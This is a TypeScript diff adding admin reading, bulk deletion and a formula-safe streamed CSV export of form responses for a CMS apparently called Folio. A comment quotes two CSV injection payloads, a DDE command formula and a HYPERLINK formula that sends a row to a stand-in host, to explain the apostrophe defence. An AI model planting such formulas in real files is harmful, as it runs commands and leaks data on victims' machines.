@@ -34,12 +34,35 @@
  * `withBindings` opens its session `PRIMARY_FIRST` and the duplicate check reads
  * what the previous click just wrote.
  */
-import { type FileAccept, FILE_ACCEPT, type FormField, type FormFieldKind } from '../core/forms'
+import {
+  type BulkOutcome,
+  type BulkReport,
+  type BulkSelection,
+  type FilterSelection,
+  readBulkCursor,
+  writeBulkCursor,
+} from '../core/bulk'
+import {
+  type FileAccept,
+  FILE_ACCEPT,
+  type FormField,
+  type FormFieldKind,
+  RESERVED_PREFIX,
+} from '../core/forms'
+import { clampLimit, decodeCursor, type Page, paginate } from '../core/pagination'
 import { readCappedBody, safeFilename, sniffContentType } from './assets'
 import { hashToken } from './auth/secrets'
-import type { FolioDb } from './db'
-import { FolioError } from './errors'
-import { fileCap, type Form, type FormMeta } from './forms'
+import { bindChunks, type FolioDb } from './db'
+import { FolioError, rethrow } from './errors'
+import {
+  deleteUploads,
+  fileCap,
+  type Form,
+  type FormMeta,
+  type ResponseFilter,
+  uploadKeysOf,
+} from './forms'
+import { type Keyset, keysetWhere, orderBy, whereOf } from './keyset'
 import {
   DOWNLOAD_CONTENT_TYPE,
   isPrintableAnswer,
@@ -1169,6 +1192,872 @@ export async function responseFileOf(
     }
   }
   return null
+}
+
+/* --------------------------------------------------------------- reading --- */
+
+/**
+ * A stored response as the **admin** reads it (`phase 7`).
+ *
+ * **A projection, like `FormResponse`, and one column narrower than the row.**
+ * `ip_hash` and `body_hash` are not here and must not be added: the first is the
+ * one quasi-identifier in the table and expires by construction (decision 10),
+ * the second is a fingerprint of the answers, and a screen that displayed either
+ * would be a screen that gave a stored hash a second life. `files` *is* here,
+ * because the drawer offers a download per question and the export names the
+ * filename somebody sent.
+ *
+ * `data` is screened on read the way `parseScopes` screens a JSON column: a value
+ * that is not a string, a number, a boolean or an array of strings is simply not
+ * an answer. A malformed row must not be the reason a table cannot be listed.
+ */
+export interface ResponseRow {
+  id: string
+  formId: string
+  version: number
+  createdAt: number
+  data: Record<string, ResponseValue>
+  locale: string
+  page: string
+  files: SubmittedFile[]
+}
+
+/** The columns every reader here projects. `ip_hash` and `body_hash` are absent
+ *  from the *statement*, not filtered afterwards — the narrower read is the one
+ *  that cannot leak. */
+const RESPONSE_COLS = `id, form_id as formId, version, created_at as createdAt,
+  data, locale, page, files`
+
+interface ResponseDbRow {
+  id: string
+  formId: string
+  version: number
+  createdAt: number
+  data: string
+  locale: string
+  page: string
+  files: string
+}
+
+/** One answer, or nothing. Arrays are screened element by element, because a
+ *  `checkboxes` answer is the one value that is a list and a list of objects is
+ *  not one. */
+function readAnswer(raw: unknown): ResponseValue | undefined {
+  if (typeof raw === 'string' || typeof raw === 'number' || typeof raw === 'boolean') return raw
+  if (Array.isArray(raw) && raw.every((one) => typeof one === 'string')) return raw as string[]
+  return undefined
+}
+
+function readAnswers(raw: string): Record<string, ResponseValue> {
+  let parsed: unknown
+  try {
+    parsed = JSON.parse(raw)
+  } catch {
+    return {}
+  }
+  if (!parsed || typeof parsed !== 'object' || Array.isArray(parsed)) return {}
+  const data: Record<string, ResponseValue> = {}
+  for (const [key, value] of Object.entries(parsed as Record<string, unknown>)) {
+    // `_` can never be a declared field name, so a key in that namespace is a
+    // row written by something other than `insertResponse` — the second of the
+    // two locks decision 13 describes, read from the other end.
+    if (key.startsWith(RESERVED_PREFIX)) continue
+    const answer = readAnswer(value)
+    if (answer !== undefined) data[key] = answer
+  }
+  return data
+}
+
+/**
+ * The `files` column as the admin reads it. Screened the way `responseFileOf`
+ * screens the same column, and **the stored `contentType` is replaced by
+ * `application/octet-stream`** for that function's reason: the label a stranger's
+ * bytes were given is not a thing any surface should echo, and there is nothing
+ * to ignore if it never arrives.
+ */
+function readFiles(raw: string): SubmittedFile[] {
+  let parsed: unknown
+  try {
+    parsed = JSON.parse(raw)
+  } catch {
+    return []
+  }
+  if (!Array.isArray(parsed)) return []
+  const files: SubmittedFile[] = []
+  for (const entry of parsed) {
+    if (!entry || typeof entry !== 'object') continue
+    const file = entry as Record<string, unknown>
+    if (typeof file.field !== 'string' || typeof file.key !== 'string' || file.key === '') continue
+    files.push({
+      field: file.field,
+      key: file.key,
+      filename: typeof file.filename === 'string' ? file.filename : 'download',
+      size: typeof file.size === 'number' ? file.size : 0,
+      contentType: DOWNLOAD_CONTENT_TYPE,
+    })
+  }
+  return files
+}
+
+function toResponse(row: ResponseDbRow): ResponseRow {
+  return {
+    id: row.id,
+    formId: row.formId,
+    version: row.version,
+    createdAt: row.createdAt,
+    data: readAnswers(row.data),
+    locale: row.locale,
+    page: row.page,
+    files: readFiles(row.files),
+  }
+}
+
+/**
+ * `(created_at, id)` descending — newest first, which is the only order a
+ * responses table is read in and exactly what `form_responses_form` covers.
+ */
+const RESPONSES_ORDER: Keyset = { columns: ['created_at', 'id'], direction: 'desc' }
+
+/**
+ * The filter's `where` fragments and their binds, form id included.
+ *
+ * **`q` is a substring scan and says so** (decision 16's sibling reasoning): no
+ * index serves a leading-wildcard `like`, so this reads the form's rows and
+ * matches the stored JSON text. Unescaped, like every other `q` in this codebase
+ * (`listRedirects`, `assetFilterSql`): a `%` or a `_` in a search term widens the
+ * match rather than narrowing it, which is the harmless direction on a read.
+ *
+ * Scanning `data` as text rather than through `json_each` is deliberate — the
+ * question the box asks is "does this response mention Ferguson", and a scan over
+ * one column answers it in one clause instead of a correlated subquery per row.
+ * It can match a *key* as well as a value, which is a wider answer than asked for
+ * and never a wrong row: the keys are the questions the person is looking at.
+ */
+function responseFilterSql(
+  formId: string,
+  filter: ResponseFilter,
+): { clauses: string[]; binds: (string | number)[] } {
+  const clauses = ['form_id = ?']
+  const binds: (string | number)[] = [formId]
+  if (filter.from !== undefined) {
+    clauses.push('created_at >= ?')
+    binds.push(filter.from)
+  }
+  if (filter.to !== undefined) {
+    clauses.push('created_at < ?')
+    binds.push(filter.to)
+  }
+  if (filter.q) {
+    clauses.push('data like ?')
+    binds.push(`%${filter.q}%`)
+  }
+  return { clauses, binds }
+}
+
+/** How many responses match, for the header and for the bulk delete's count
+ *  guard — one function, so the number a person read and the number the guard
+ *  re-runs cannot come from two different sets of clauses. */
+export async function countResponses(
+  db: FolioDb,
+  formId: string,
+  filter: ResponseFilter = {},
+): Promise<number> {
+  const { clauses, binds } = responseFilterSql(formId, filter)
+  const row = await db
+    .prepare(`select count(*) as n from form_responses ${whereOf(...clauses)}`)
+    .bind(...binds)
+    .first<{ n: number }>()
+  return row?.n ?? 0
+}
+
+export interface ListResponsesOptions {
+  limit?: number
+  cursor?: string
+  filter?: ResponseFilter
+  /**
+   * Adds `total` for the filtered set **and** `oldest` for the whole form.
+   *
+   * One opt-in for two numbers, and the asymmetry between them is the point.
+   * `total` is what the header counts and what a select-all's guard compares
+   * against (`pagination.md` decision 5 insists those be one query); `oldest`
+   * ignores the filter entirely, because decision 17 asks this screen to show
+   * *"the age of the oldest row"* as the standing symptom of manual retention,
+   * and a number that moved every time somebody typed in the search box would
+   * say nothing about retention at all.
+   */
+  count?: boolean
+}
+
+export interface ResponsePage extends Page<ResponseRow> {
+  /** When this form's first surviving response arrived, or null when it has
+   *  none. Absent unless `count` was asked for. */
+  oldest?: number | null
+}
+
+/**
+ * One page of a form's responses, newest first
+ * (`../../docs/specs/content-model/forms.md` phase 7).
+ *
+ * `FolioDb`, never `D1Database`: this is a `GET` under `{base}/api`, so
+ * `withBindings` has already opened the request's session and every read here
+ * can reach a replica.
+ *
+ * Nothing binds a caller-sized list — four binds at the widest, whatever the
+ * filter says and however many rows come back.
+ */
+export async function listResponses(
+  db: FolioDb,
+  formId: string,
+  opts: ListResponsesOptions = {},
+): Promise<ResponsePage> {
+  const limit = clampLimit(opts.limit, 50, 200)
+  const cursor = opts.cursor ? decodeCursor(opts.cursor) : null
+  const resume = keysetWhere(RESPONSES_ORDER, cursor)
+  const { clauses, binds } = responseFilterSql(formId, opts.filter ?? {})
+
+  const [rows, counted] = await Promise.all([
+    db
+      .prepare(
+        `select ${RESPONSE_COLS} from form_responses
+         ${whereOf(...clauses, resume.sql)} ${orderBy(RESPONSES_ORDER)} limit ?`,
+      )
+      .bind(...binds, ...resume.binds, limit + 1)
+      .all<ResponseDbRow>(),
+    opts.count
+      ? Promise.all([
+          countResponses(db, formId, opts.filter ?? {}),
+          db
+            .prepare('select min(created_at) as oldest from form_responses where form_id = ?')
+            .bind(formId)
+            .first<{ oldest: number | null }>(),
+        ])
+      : null,
+  ])
+
+  const page = paginate(rows.results.map(toResponse), limit, (row) => [row.createdAt, row.id])
+  if (!counted) return page
+  const [total, oldest] = counted
+  return { ...page, total, oldest: oldest?.oldest ?? null }
+}
+
+/**
+ * One response, every key it holds.
+ *
+ * **`form_id` is bound as well as the id**, `responseFileOf`'s rule: a response
+ * id is unguessable, and a route that checks only the id is a route whose access
+ * control *is* the id.
+ */
+export async function responseById(
+  db: FolioDb,
+  formId: string,
+  id: string,
+): Promise<ResponseRow | null> {
+  const row = await db
+    .prepare(`select ${RESPONSE_COLS} from form_responses where id = ? and form_id = ?`)
+    .bind(id, formId)
+    .first<ResponseDbRow>()
+  return row ? toResponse(row) : null
+}
+
+/* -------------------------------------------------------------- deleting --- */
+
+export interface DeleteResponseResult {
+  deleted: boolean
+  /** Objects removed with it. Zero for a text-only response, and zero for a
+   *  delete that found no row. */
+  files: number
+}
+
+/**
+ * One response and its uploads.
+ *
+ * **D1 first, then R2, and the R2 failure is swallowed** — `deleteAsset`'s rule,
+ * and the *inverse* of `deleteForm`'s. The order is what decides it: here the
+ * keys are read before the row goes, so by the time the objects are reached the
+ * row is already committed gone and there is nothing left to retry *from*. A
+ * throw would report a failure the caller cannot act on, over a row that is
+ * already deleted. `deleteForm` inverts both halves because it has to walk the
+ * rows to learn the keys at all.
+ *
+ * The read is the same statement `responseFileOf` uses, one column wide: a
+ * delete has no business loading a stranger's answers into memory.
+ */
+export async function deleteResponse(
+  db: FolioDb,
+  formId: string,
+  id: string,
+  bucket?: R2Bucket,
+): Promise<DeleteResponseResult> {
+  const row = await db
+    .prepare('select files from form_responses where id = ? and form_id = ?')
+    .bind(id, formId)
+    .first<{ files: string }>()
+  if (!row) return { deleted: false, files: 0 }
+
+  const keys = uploadKeysOf(row.files)
+  const result = await db
+    .prepare('delete from form_responses where id = ? and form_id = ?')
+    .bind(id, formId)
+    .run()
+  if ((result.meta.changes ?? 0) === 0) return { deleted: false, files: 0 }
+
+  await sweepUploads(bucket, keys)
+  return { deleted: true, files: keys.length }
+}
+
+/**
+ * Objects whose rows are already gone, best effort.
+ *
+ * Swallowed with one line, `deleteAsset`'s posture and `runOne`'s shape: the row
+ * is committed, so a throw here cannot be undone into anything and would only
+ * turn a completed delete into an error somebody re-runs against nothing. An
+ * orphaned object costs storage; a delete that reports failure over a row that is
+ * gone costs trust in the button.
+ */
+async function sweepUploads(bucket: R2Bucket | undefined, keys: readonly string[]): Promise<void> {
+  if (!bucket || keys.length === 0) return
+  try {
+    await deleteUploads(bucket, keys)
+  } catch (e) {
+    console.error('folio: could not delete uploaded files for a deleted response', e)
+  }
+}
+
+/** The only bulk action over responses. A one-member union rather than a bare
+ *  string, so `BulkReport<ResponseBulkAction>` names what it did and a client
+ *  cannot read an action the server can never send. */
+export type ResponseBulkAction = 'delete'
+
+/** How many responses one call deletes before handing back a cursor. Twenty-five,
+ *  `runBulk`'s and `runAssetBulk`'s number, and for their reason: a delete is a
+ *  statement plus an R2 call per batch. */
+export const DEFAULT_RESPONSE_BULK_BATCH = 25
+
+/** Ceiling on `batch`, the 200 every batched run in this codebase shares. */
+export const MAX_RESPONSE_BULK_BATCH = 200
+
+export interface ResponseBulkDeps {
+  db: FolioDb
+  /** Absent is legal: a form with no file question has no objects to remove, and
+   *  a delete that found keys with no bucket leaves them rather than refusing —
+   *  the rows are what the person asked to destroy. */
+  media?: R2Bucket | undefined
+}
+
+export interface ResponseBulkOptions {
+  batch?: number
+  continueFrom?: string | null
+  dryRun?: boolean
+}
+
+/**
+ * A bulk delete over a selection of responses
+ * (`../../docs/specs/platform/bulk-writes.md`, `core/bulk.ts`).
+ *
+ * **A third runner rather than a generic one**, which is `runAssetBulk`'s own
+ * argument taken one table further: what the three share is `core/bulk.ts` — the
+ * selection shapes, the report shapes, the cursor codec and the rules written on
+ * them — and a runner generic over five dependency bags for the sake of a `for`
+ * loop is worse than three loops. This one is the smallest of the three: one
+ * action, two dependencies, no per-row usage question to answer.
+ *
+ * Four properties are `runBulk`'s and are load-bearing here for its reasons:
+ *
+ * - **The count is the guard, checked once at the start of the job**, and it is
+ *   also the ceiling — a run touches at most `expected - exclude.length` rows
+ *   however many batches it takes. A refusal is a *value*, not a throw.
+ * - **Execution is a batched job.** One call does up to `batch` rows and answers
+ *   `continueFrom`; the caller re-calls until it is null.
+ * - **Every row is its own `try`**, so one row that D1 refuses does not abandon
+ *   the twenty-four behind it.
+ * - **The objects go after the rows, per batch, and their failure is swallowed.**
+ *   A batch whose every object delete failed still advances the cursor — the
+ *   spec's own edge case — because the rows it named are gone and re-reading them
+ *   is not a thing the cursor can do.
+ *
+ * **Nothing binds a caller-sized list.** The ids of an explicit selection are
+ * chunked through `bindChunks`; the keys never reach a statement at all, because
+ * they come off rows this batch already read and go straight to R2, which caps a
+ * `delete` at a thousand keys and has no bind ceiling.
+ */
+export async function deleteResponses(
+  deps: ResponseBulkDeps,
+  formId: string,
+  selection: BulkSelection<ResponseFilter>,
+  opts: ResponseBulkOptions = {},
+): Promise<BulkOutcome<ResponseBulkAction>> {
+  const { db } = deps
+  const dryRun = opts.dryRun === true
+  const batch = Math.min(
+    Math.max(Math.trunc(opts.batch ?? DEFAULT_RESPONSE_BULK_BATCH), 1),
+    MAX_RESPONSE_BULK_BATCH,
+  )
+  const resume = opts.continueFrom ? readResponseCursor(opts.continueFrom) : null
+
+  // Before the ceiling check, exactly as `runAssetBulk` orders it: a cursor that
+  // disagrees with the list it was issued against is a client bug whatever the
+  // arithmetic says, and an exhausted allowance would otherwise report a placid
+  // "nothing left to do" for it.
+  if (!selection.all && resume !== null && selection.ids[resume.seen - 1] !== resume.after) {
+    throw new FolioError(
+      'bad_request',
+      'The selection changed between batches. Start the operation again.',
+    )
+  }
+
+  const total = selection.all
+    ? Math.max(selection.expected - (selection.exclude?.length ?? 0), 0)
+    : selection.ids.length
+  const seen = resume?.seen ?? 0
+
+  if (selection.all && resume === null) {
+    const actual = await countResponses(db, formId, selection.filter)
+    if (actual !== selection.expected) {
+      return { refused: 'count', expected: selection.expected, actual }
+    }
+  }
+
+  const report: BulkReport<ResponseBulkAction> = {
+    action: 'delete',
+    done: 0,
+    failed: [],
+    total,
+    seen,
+    continueFrom: null,
+    dryRun,
+  }
+
+  const allowance = total - seen
+  if (allowance <= 0) return report
+
+  const { rows, consumed, exhausted, last } = selection.all
+    ? await responseFilterBatch(db, formId, selection, resume?.after ?? null, batch, allowance)
+    : await responseIdBatch(db, formId, selection.ids, seen, Math.min(batch, allowance))
+
+  const keys: string[] = []
+  for (const row of rows) {
+    if (row === null) {
+      // An id the client named and D1 no longer has. A delete has already got
+      // what it asked for, so this is a success rather than a named failure —
+      // `runAssetBulk`'s reading of the same case.
+      report.done++
+      continue
+    }
+    if (dryRun) {
+      report.done++
+      continue
+    }
+    try {
+      await db
+        .prepare('delete from form_responses where id = ? and form_id = ?')
+        .bind(row.id, formId)
+        .run()
+      keys.push(...uploadKeysOf(row.files))
+      report.done++
+    } catch (e) {
+      report.failed.push({
+        id: row.id,
+        title: whenOf(row.createdAt),
+        message: reasonOf(e),
+      })
+    }
+  }
+
+  // After the rows, once per batch rather than once per row: the keys are already
+  // in hand and R2 takes a thousand at a time.
+  if (!dryRun) await sweepUploads(deps.media, keys)
+
+  report.seen = seen + consumed
+  report.continueFrom =
+    exhausted || report.seen >= total || last === null ? null : writeBulkCursor(last, report.seen)
+  return report
+}
+
+/** A row this runner needs and nothing more: the id to delete, the keys to
+ *  sweep, and a timestamp to name it by in a failure report. */
+interface BulkResponseRow {
+  id: string
+  createdAt: number
+  files: string
+}
+
+interface ResponseBatch {
+  rows: (BulkResponseRow | null)[]
+  consumed: number
+  exhausted: boolean
+  last: string | null
+}
+
+/**
+ * One batch of a captured filter.
+ *
+ * **Walked by `id`, not by `created_at`** — `uploadKeysPage`'s reason, one table
+ * over: the set is being destroyed as it is walked, and `id` is the one key that
+ * is stable, unique and rewritten by nothing. The list the person was looking at
+ * is newest-first; the *walk* is not the list, and nothing about a delete depends
+ * on the order it happens in.
+ *
+ * **The exclusions are applied here, in JavaScript, not in the `where`.** A
+ * selection's `exclude` is up to 500 ids, five times `D1_BIND_CAP`, and no
+ * chunking rescues a single statement (`filterBatch` says the same). `last` is
+ * the last row **read**, not the last kept, so the cursor steps past an excluded
+ * row rather than reading it forever.
+ */
+async function responseFilterBatch(
+  db: FolioDb,
+  formId: string,
+  selection: FilterSelection<ResponseFilter>,
+  after: string | null,
+  limit: number,
+  allowance: number,
+): Promise<ResponseBatch> {
+  const { clauses, binds } = responseFilterSql(formId, selection.filter)
+  const resume = after === null ? [] : ['id > ?']
+  const { results } = await db
+    .prepare(
+      `select id, created_at as createdAt, files from form_responses
+       ${whereOf(...clauses, ...resume)} order by id limit ?`,
+    )
+    .bind(...binds, ...(after === null ? [] : [after]), limit)
+    .all<BulkResponseRow>()
+
+  const excluded = new Set(selection.exclude ?? [])
+  const kept = excluded.size === 0 ? results : results.filter((row) => !excluded.has(row.id))
+  const acting = kept.length > allowance ? kept.slice(0, allowance) : kept
+  return {
+    rows: acting,
+    consumed: acting.length,
+    exhausted: results.length < limit,
+    last: results.at(-1)?.id ?? null,
+  }
+}
+
+/**
+ * One batch of an explicit id list.
+ *
+ * The client re-posts the same `ids` every call, so the slice offset *is* the
+ * cursor's counter. `consumed` is the *slice* length rather than the row count,
+ * because a row already deleted is absent from the read and counting rows would
+ * read a stale id as the end of the list.
+ *
+ * Chunked at one bind a row plus the form id, so a 500-id selection is five
+ * statements rather than one that D1 refuses.
+ */
+async function responseIdBatch(
+  db: FolioDb,
+  formId: string,
+  ids: readonly string[],
+  seen: number,
+  limit: number,
+): Promise<ResponseBatch> {
+  const slice = ids.slice(seen, seen + limit)
+  const pages = await Promise.all(
+    bindChunks(slice, 1).map(async (chunk) => {
+      const { results } = await db
+        .prepare(
+          `select id, created_at as createdAt, files from form_responses
+           where form_id = ? and id in (${chunk.map(() => '?').join(', ')})`,
+        )
+        .bind(formId, ...chunk)
+        .all<BulkResponseRow>()
+      return results
+    }),
+  )
+  const found = new Map(pages.flat().map((row) => [row.id, row]))
+  return {
+    rows: slice.map((id) => found.get(id) ?? null),
+    consumed: slice.length,
+    exhausted: slice.length < limit,
+    last: slice.at(-1) ?? null,
+  }
+}
+
+function readResponseCursor(raw: string): { after: string; seen: number } {
+  const at = readBulkCursor(raw)
+  if (!at) throw new FolioError('bad_request', 'Malformed pagination cursor')
+  return at
+}
+
+/** Why one row could not be deleted, as text that goes straight into a toast —
+ *  `runAssetBulk`'s `reasonOf`, and anything `rethrow` declines to translate gets
+ *  the generic sentence here and the real one in the log. */
+function reasonOf(e: unknown): string {
+  try {
+    rethrow(e)
+  } catch (translated) {
+    if (translated instanceof FolioError) return translated.message
+  }
+  console.error('folio: could not delete a form response', e)
+  return 'Could not delete it'
+}
+
+/** A row named by when it arrived, because a response has no title. ISO to the
+ *  minute: a report is prose a person reads, and `res_9f2c…` is not. */
+function whenOf(at: number): string {
+  return new Date(at).toISOString().slice(0, 16).replace('T', ' ')
+}
+
+/* ---------------------------------------------------------------- export --- */
+
+/**
+ * A CSV of a form's responses, streamed
+ * (`../../docs/specs/content-model/forms.md` decision 16).
+ *
+ * Two properties carry this file's half of the feature, and both are about the
+ * fact that **every cell here was typed by a stranger**:
+ *
+ * - **A cell beginning `=`, `+`, `-`, `@`, a tab or a carriage return is prefixed
+ *   with an apostrophe.** CSV formula injection is not hypothetical for a surface
+ *   whose entire input is anonymous: `=cmd|'/c calc'!A1` in a name field executes
+ *   when the file is opened in Excel, and `=HYPERLINK("http://x/"&A2,"click")`
+ *   exfiltrates the row beside it. The prefix is what Excel and Sheets both read
+ *   as "this is text".
+ * - **Quoting is RFC 4180 and applies on top of the prefix, never instead of
+ *   it.** A cell holding a quote, a comma or a newline is wrapped and its quotes
+ *   doubled; a cell holding `=1,2` gets both treatments.
+ *
+ * The header is assembled once, before a byte is written, from **the union of
+ * every key ever submitted to this form** plus the questions it currently
+ * declares. Current fields come first in the form's order, retired keys after and
+ * sorted — so a column that has stopped being asked keeps its data and stops
+ * being confused with one that is still live.
+ */
+
+/** The byte order mark. Written as an escape rather than as the character
+ *  itself, because a literal BOM inside a template string is invisible in every
+ *  editor and diff that would need to show it. */
+const BOM = '\ufeff'
+
+/** Rows per keyset page while streaming. Two hundred is the list route's own
+ *  ceiling, and a page holds answers rather than ids, so it is a memory bound. */
+const CSV_PAGE = 200
+
+/** What a current field asks for and a response never answered — decision 16's
+ *  rule that *"this did not exist yet"* and *"they left it blank"* are different
+ *  facts and must not both render as an empty cell. */
+const CSV_ABSENT = '—'
+
+/**
+ * The five columns that are not answers.
+ *
+ * **Named in Folio's reserved namespace, which is what makes them collision-proof
+ * rather than merely unlikely** (decision 13): `validateFormFields` refuses a
+ * field slug starting with `_`, and `NAME` requires the first character to be
+ * `[a-z]`, so no submitted key can ever be one of these. A header of prose
+ * (`Submitted at`) would have been friendlier and would have relied on nobody
+ * ever naming a question that.
+ */
+const META_COLUMNS = [
+  { key: '_submitted_at', source: 'meta' as const },
+  { key: '_response_id', source: 'meta' as const },
+  { key: '_version', source: 'meta' as const },
+  { key: '_locale', source: 'meta' as const },
+  { key: '_page', source: 'meta' as const },
+]
+
+export interface CsvColumn {
+  /** The header cell, and the `data` key or file field it reads. */
+  key: string
+  /**
+   * Where the value comes from. `field` is a question the form still declares,
+   * `retired` a key only older responses hold, `meta` one of the five above.
+   */
+  source: 'meta' | 'field' | 'retired'
+  /** A `file` question: the value is a filename out of the `files` column, since
+   *  an upload stores no answer in `data` at all. */
+  file?: boolean
+}
+
+/** Which field kinds are a column. `statement` is prose between questions and
+ *  stores nothing, so a column for one would be a column of `—`. */
+const isColumnKind = (field: FormField): boolean => field.kind !== 'statement'
+
+/**
+ * The header, in decision 16's order: metadata, then the form's current
+ * questions in the order the builder shows them, then every other key any
+ * response holds, sorted.
+ *
+ * `keys` is screened against the field-name charset rather than trusted. It comes
+ * out of `json_each` over a stored column, so a row written by something other
+ * than `insertResponse` could otherwise put an arbitrary string in a header cell —
+ * and a header cell is the one place in this file a value is not also a value.
+ */
+export function responseCsvColumns(
+  fields: readonly FormField[],
+  keys: readonly string[],
+): CsvColumn[] {
+  const columns: CsvColumn[] = [...META_COLUMNS]
+  const declared = new Set<string>()
+  for (const field of fields) {
+    if (!isColumnKind(field)) continue
+    declared.add(field.name)
+    columns.push({
+      key: field.name,
+      source: 'field',
+      ...(field.kind === 'file' ? { file: true } : {}),
+    })
+  }
+  const retired = [...new Set(keys)].filter((key) => CSV_KEY.test(key) && !declared.has(key)).sort()
+  for (const key of retired) columns.push({ key, source: 'retired' })
+  return columns
+}
+
+/** The charset a field name has, applied to a key read back out of storage. */
+const CSV_KEY = /^[a-z][a-z0-9_]{0,63}$/
+
+/**
+ * One value as text.
+ *
+ * A `checkboxes` answer is a list and is joined with `, ` — inside a quoted cell,
+ * which is what makes the comma legal rather than a column boundary. A boolean is
+ * `yes`/`no` rather than `true`/`false`: the question was a tick box and the
+ * answer is a person's, not a program's.
+ */
+export function csvValue(column: CsvColumn, response: ResponseRow): string {
+  if (column.source === 'meta') return metaValue(column.key, response)
+  // The files column is checked for **every** answer column, not only a current
+  // `file` question: a retired file question leaves no key in `data` at all, so
+  // reading `data` first would render an attachment somebody sent as `—`.
+  const file = response.files.find((one) => one.field === column.key)
+  if (file) return file.filename
+  if (column.file) return CSV_ABSENT
+  const value = response.data[column.key]
+  if (value === undefined) return CSV_ABSENT
+  if (Array.isArray(value)) return value.join(', ')
+  if (typeof value === 'boolean') return value ? 'yes' : 'no'
+  return String(value)
+}
+
+function metaValue(key: string, response: ResponseRow): string {
+  switch (key) {
+    case '_submitted_at':
+      return new Date(response.createdAt).toISOString()
+    case '_response_id':
+      return response.id
+    case '_version':
+      return String(response.version)
+    case '_locale':
+      return response.locale
+    default:
+      return response.page
+  }
+}
+
+/**
+ * The characters a spreadsheet reads as "this cell is code".
+ *
+ * The four decision 16 names, plus a tab and a carriage return: both are leading
+ * whitespace Excel skips before it looks for a formula, so `\t=1+1` is a formula
+ * that a check on `=` alone lets through.
+ */
+const FORMULA_LEAD = /^[=+\-@\t\r]/
+
+/**
+ * One cell, de-fanged and then quoted.
+ *
+ * **The order matters and only one of the two is optional.** The apostrophe goes
+ * on first, because a value that begins `=` is dangerous whether or not it also
+ * needs quoting; the quoting then wraps whatever came out. Reversing them would
+ * put the prefix outside the quotes, where it is a stray character in the file
+ * rather than an escape in the cell.
+ */
+export function csvCell(raw: string): string {
+  const defanged = FORMULA_LEAD.test(raw) ? `'${raw}` : raw
+  return /["\n\r,]/.test(defanged) ? `"${defanged.replace(/"/g, '""')}"` : defanged
+}
+
+/** One line, RFC 4180's CRLF. */
+export function csvRow(cells: readonly string[]): string {
+  return `${cells.map(csvCell).join(',')}\r\n`
+}
+
+/**
+ * Every key any response to this form holds — one query, before the first row is
+ * written, so the export never has to be buffered to discover its own columns.
+ *
+ * SQLite's JSON1 is built into D1, so this is one scan of the form's responses.
+ * It reads `files` as well as `data`: a `file` question stores no answer, so a
+ * *retired* one would otherwise vanish from the export entirely, taking the
+ * filenames of everything anybody ever attached with it.
+ *
+ * Two binds, whatever the form holds.
+ */
+export async function submittedKeys(db: FolioDb, formId: string): Promise<string[]> {
+  const { results } = await db
+    .prepare(
+      `select distinct key from (
+         select j.key as key from form_responses, json_each(form_responses.data) j
+          where form_responses.form_id = ?
+         union
+         select json_extract(f.value, '$.field') as key
+           from form_responses, json_each(form_responses.files) f
+          where form_responses.form_id = ?
+       ) where key is not null`,
+    )
+    .bind(formId, formId)
+    .all<{ key: string }>()
+  return results.map((row) => row.key)
+}
+
+export interface ResponseCsv {
+  /** `content-disposition`'s filename. ASCII by construction — `safeFilename`,
+   *  the codebase's one sanitiser — so the header cannot be split by it. */
+  filename: string
+  body: ReadableStream<Uint8Array>
+}
+
+/**
+ * The export, as a stream (`../../docs/specs/foundation/pagination.md`'s keyset,
+ * walked).
+ *
+ * The header query is awaited **before** the stream is built, so a failure there
+ * is an ordinary error response rather than a truncated file somebody opens in
+ * Excel and believes. Everything after it is pulled a page at a time: a
+ * fifty-thousand-row form is 250 statements and never one buffered string.
+ *
+ * A **BOM** leads the file. It is the one thing that makes Excel on Windows read
+ * a UTF-8 CSV as UTF-8 rather than as the machine's local code page, and the
+ * export exists for people whose next step is opening it there; every other
+ * parser skips it. Named here because it is a byte before the header that a test
+ * asserting "the header is exact" has to know about.
+ */
+export async function responseCsv(
+  db: FolioDb,
+  form: Form,
+  filter: ResponseFilter = {},
+): Promise<ResponseCsv> {
+  const columns = responseCsvColumns(form.fields, await submittedKeys(db, form.id))
+  const encoder = new TextEncoder()
+  const date = new Date().toISOString().slice(0, 10)
+
+  let cursor: string | undefined
+  let finished = false
+
+  const body = new ReadableStream<Uint8Array>({
+    start(controller) {
+      controller.enqueue(encoder.encode(BOM + csvRow(columns.map((column) => column.key))))
+    },
+    async pull(controller) {
+      if (finished) {
+        controller.close()
+        return
+      }
+      const page = await listResponses(db, form.id, {
+        limit: CSV_PAGE,
+        filter,
+        ...(cursor ? { cursor } : {}),
+      })
+      let chunk = ''
+      for (const response of page.rows) {
+        chunk += csvRow(columns.map((column) => csvValue(column, response)))
+      }
+      if (chunk !== '') controller.enqueue(encoder.encode(chunk))
+      cursor = page.cursor ?? undefined
+      if (!cursor) finished = true
+    },
+  })
+
+  return { filename: safeFilename(`${form.name}-responses-${date}.csv`), body }
 }
 
 /* ------------------------------------------------- the host's own half --- */
